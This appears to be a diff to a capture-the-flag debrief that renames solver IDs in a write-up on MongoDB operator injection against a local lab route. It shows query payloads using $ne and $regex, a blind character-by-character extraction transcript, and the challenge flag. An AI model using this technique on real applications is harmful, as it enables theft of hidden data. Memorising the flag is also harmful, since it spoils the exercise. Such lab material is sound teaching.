@@ -1,6 +1,6 @@
 # Basic Records Room, Debrief
 
-**Node:** `p4_1` &middot; **Flag:** `SEIYAKU{operators_not_strings}` &middot; **Route:** `GET/POST /p4/records` &middot; **Sink:** `challenges/phase4.py`, MongoDB (`records` collection) &middot; **Signal:** boolean-ish (`matched: true/false`, plus a bare count)
+**Node:** `p4_3` &middot; **Flag:** `SEIYAKU{operators_not_strings}` &middot; **Route:** `GET/POST /p4/records` &middot; **Sink:** `challenges/phase4.py`, MongoDB (`records` collection) &middot; **Signal:** boolean-ish (`matched: true/false`, plus a bare count)
 
 ## MongoDB / MQL basics, briefly
 
@@ -176,7 +176,7 @@ curl -s -G "http://localhost:8000/p4/records" \
 # {"count":0,"field":"archive_key","matched":false}  -> length > 29
 ```
 
-`solvers/p4_1.py`'s live run against this exact seed converged on
+`solvers/p4_3.py`'s live run against this exact seed converged on
 `LENGTH(archive_key) = 30` in 6 requests (see its full transcript
 below).
 
@@ -238,22 +238,22 @@ curl -s -X POST "http://localhost:8000/p4/records" \
 
 ### Full live extraction
 
-`solvers/p4_1.py` automates all four steps above against the real
+`solvers/p4_3.py` automates all four steps above against the real
 route and the real seeded MongoDB, no hardcoded or simulated values
 except the final assertion. A real run against this exact seed:
 
 ```
-[p4_1] target: http://localhost:8000/p4/records
-[p4_1] step 0, confirm the search oracle + real type confusion
+[p4_3] target: http://localhost:8000/p4/records
+[p4_3] step 0, confirm the search oracle + real type confusion
   subject='Restricted Exam Incident Reports' (plain string) -> matched=True
   subject='definitely-not-a-real-subject-xyz' -> matched=False
   subject[$ne]='definitely-not-a-real-subject-xyz' -> matched=True
   subject[$regex]='^Restricted' -> matched=True
   ok: dict-valued `value` genuinely reaches MongoDB as query operators
-[p4_1] step 1, confirm hidden field 'archive_key' exists and starts with SEIYAKU
+[p4_3] step 1, confirm hidden field 'archive_key' exists and starts with SEIYAKU
   archive_key[$regex]='^SEIYAKU' -> matched=True
   ok: hidden field exists and is reachable via $regex
-[p4_1] step 2, binary-search LENGTH(archive_key) via $regex
+[p4_3] step 2, binary-search LENGTH(archive_key) via $regex
   len<=32? -> True
   len<=16? -> False
   len<=24? -> False
@@ -261,20 +261,20 @@ except the final assertion. A real run against this exact seed:
   len<=30? -> True
   len<=29? -> False
   ok: LENGTH(archive_key) = 30
-[p4_1] step 3, walk archive_key char-by-char via $regex character-class bisection
+[p4_3] step 3, walk archive_key char-by-char via $regex character-class bisection
   position  1: 'S'  (so far: 'S')
   position  2: 'E'  (so far: 'SE')
   ...
   position 29: 's'  (so far: 'SEIYAKU{operators_not_strings')
   position 30: '}'  (so far: 'SEIYAKU{operators_not_strings}')
-[p4_1] step 4, cross-validate recovered value via $gt/$lt/$eq bracketing
+[p4_3] step 4, cross-validate recovered value via $gt/$lt/$eq bracketing
   archive_key[$eq]='SEIYAKU{operators_not_strings}' -> matched=True
   archive_key[$gt]='SEIYAKU{operators_not_strings|' -> matched=True
   archive_key[$lt]='SEIYAKU{operators_not_strings~' -> matched=True
   ok: $eq / $gt / $lt all independently agree with the $regex-recovered value
-[p4_1] recovered value: SEIYAKU{operators_not_strings}
+[p4_3] recovered value: SEIYAKU{operators_not_strings}
   ok: recovered flag matches: SEIYAKU{operators_not_strings}
-[p4_1] PASS
+[p4_3] PASS
 ```
 
 Wall-clock time for the entire walk (confirmed live): **~2 seconds**,
